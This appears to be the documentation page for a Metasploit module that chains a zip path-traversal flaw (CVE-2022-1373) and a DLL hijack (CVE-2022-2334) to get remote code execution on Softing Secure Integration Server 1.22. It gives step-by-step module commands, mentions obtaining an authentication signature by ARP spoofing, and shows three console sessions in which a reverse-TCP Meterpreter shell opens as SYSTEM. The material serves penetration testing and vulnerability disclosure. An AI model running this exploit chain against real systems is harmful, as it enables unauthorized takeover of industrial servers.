## Description

This module chains 2 vulnerabilities (CVE-2022-1373 and CVE-2022-2334) to achieve authenticated remote code execution against Softing Secure Integration Server v1.22.

This was demonstrated by Steven Seeley and Chris Anastasio of Incite Team as part of Pwn2Own Miami 2022.

In CVE-2022-1373, the restore configuration feature is vulnerable to a directory traversal vulnerablity when processing zip files. When using the "restore configuration" feature to upload a zip file containing a path traversal file which is a dll called ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\wbem\\wbemcomn.dll. This causes the file C:\\Windows\\System32\\wbem\\wbemcomn.dll to be created and executed upon touching the disk.

In CVE-2022-2334, the planted wbemcomn.dll is used in a DLL hijacking attack when Softing Secure Integration Server restarts upon restoring configuration, which allows us to execute arbitrary code on the target system.

The chain demonstrated in Pwn2Own used a signature instead of a password. The signature was acquired by running an ARP spoofing attack against the local network where the Softing SIS server was located. A username is also required for signature authentication. When using asignature, any provided password is ignored. To use passwords again, `unset SIGNATURE`.

A custom DLL can be provided to use in the exploit instead of using the default MSF-generated one. The DLL must be compiled with the correct exports, which can be found in "external/source/exploits/CVE-2022-2334/template.def". It is assumed that the operator has compiled the DLL correctly for the exploit, if a custom DLL is specified.

## Vulnerable Application

This module was tested against version 1.22, installed on Windows Server 2019 Standard x64. Older versions of the vulnerable application are no longer available for download.

## Verification Steps
Example steps in this format (is also in the PR):

1. Start `msfconsole`
2. Do: `use exploit/windows/http/softing_sis_rce`
3. Do: `set RHOSTS <target_ip>`
4. Do: Optional: `set SSL true` if necessary
5. Do: Optional: `set RPORT <target_port>` if SSL is set
6. Do: `set USERNAME <username>` if necessary. Default is `admin`
7. Do: `set PASSWORD <password>` if necessary. Default is `admin`
8. Do: Optional: `set SIGNATURE <signature>` to use signature authentication. `PASSWORD` will be ignored if `SIGNATURE` is set!
9. Do: Optional: `set DLLPATH <path_to_custom_dll>` to use a custom DLL. It is assumed that the DLL is correctly compiled by the operator for the exploit.
10. Do: `exploit` and get a shell
11. Do: Recommended: delete `C:\\Windows\\System32\\wbem\\wbemcomn.dll` 

## Scenarios
### Default options

```
msf6 > use exploit/windows/http/softing_sis_rce
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/softing_sis_rce) > set RHOSTS 192.168.50.119
RHOSTS => 192.168.50.119
msf6 exploit(windows/http/softing_sis_rce) > exploit

[*] Started reverse TCP handler on 192.168.50.254:4444
[*] 192.168.50.119:8099 - Found Softing Secure Integration Server 1.22.0.8686
[+] 192.168.50.119:8099 - Valid credentials provided
[*] Generating payload DLL...
[*] Created /home/kali/.msf4/local/wbemcomn.dll
[*] Saving configuration...
[*] Saved configuration to /home/kali/.msf4/local/config_download_5fd1e0fd8cd04a22f38eb8db14df68ff.zip
[*] Sending stage (201798 bytes) to 192.168.50.119
[!] Deleting: C:\Windows\System32\wbem\wbemcomn.dll
[-] Unable to delete - stdapi_fs_delete_file: Operation failed: Access is denied.
[*] Meterpreter session 1 opened (192.168.50.254:4444 -> 192.168.50.119:50525) at 2024-04-11 19:52:35 +0800
[!] This exploit may require manual cleanup of 'C:\Windows\System32\wbem\wbemcomn.dll' on the target

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### Using a signature
```
msf6 > use exploit/windows/http/softing_sis_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/softing_sis_rce) > set RHOSTS 192.168.50.119
RHOSTS => 192.168.50.119
msf6 exploit(windows/http/softing_sis_rce) > set SIGNATURE f7f623f3d40764a03da6c3379919b964
SIGNATURE => f7f623f3d40764a03da6c3379919b964
msf6 exploit(windows/http/softing_sis_rce) > exploit

[*] Started reverse TCP handler on 192.168.50.254:4444
[*] 192.168.50.119:8099 - Found Softing Secure Integration Server 1.22.0.8686
[*] 192.168.50.119:8099 - Authenticating as user admin with signature f7f623f3d40764a03da6c3379919b964...
[+] 192.168.50.119:8099 - Signature f7f623f3d40764a03da6c3379919b964 is valid for user admin
[*] Generating payload DLL...
[*] Created /home/kali/.msf4/local/wbemcomn.dll
[*] 192.168.50.119:8099 - Saving configuration...
[*] Saved configuration to /home/kali/.msf4/local/config_download_5fd1e0fd8cd04a22f38eb8db14df68ff.zip
[*] Sending stage (201798 bytes) to 192.168.50.119
[!] Deleting: C:\Windows\System32\wbem\wbemcomn.dll
[-] Unable to delete - stdapi_fs_delete_file: Operation failed: Access is denied.
[*] Meterpreter session 4 opened (192.168.50.254:4444 -> 192.168.50.119:50618) at 2024-04-11 20:00:11 +0800
[!] This exploit may require manual cleanup of 'C:\Windows\System32\wbem\wbemcomn.dll' on the target

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### Using a custom DLL
```
msf6 > use exploit/windows/http/softing_sis_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/softing_sis_rce) > set RHOSTS 192.168.50.119
RHOSTS => 192.168.50.119
msf6 exploit(windows/http/softing_sis_rce) > set DLLPATH /home/kali/Documents/softing/wbemcomn.dll
DLLPATH => /home/kali/Documents/softing/wbemcomn.dll
msf6 exploit(windows/http/softing_sis_rce) > exploit

[*] Started reverse TCP handler on 192.168.50.254:4444
[*] 192.168.50.119:8099 - Found Softing Secure Integration Server 1.22.0.8686
[+] 192.168.50.119:8099 - Valid credentials provided
[*] 192.168.50.119:8099 - Saving configuration...
[*] Saved configuration to /home/kali/.msf4/local/config_download_5fd1e0fd8cd04a22f38eb8db14df68ff.zip
[*] Sending stage (201798 bytes) to 192.168.50.119
[!] Deleting: C:\Windows\System32\wbem\wbemcomn.dll
[-] Unable to delete - stdapi_fs_delete_file: Operation failed: Access is denied.
[*] Meterpreter session 5 opened (192.168.50.254:4444 -> 192.168.50.119:50696) at 2024-04-11 20:03:43 +0800
[!] This exploit may require manual cleanup of 'C:\Windows\System32\wbem\wbemcomn.dll' on the target

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
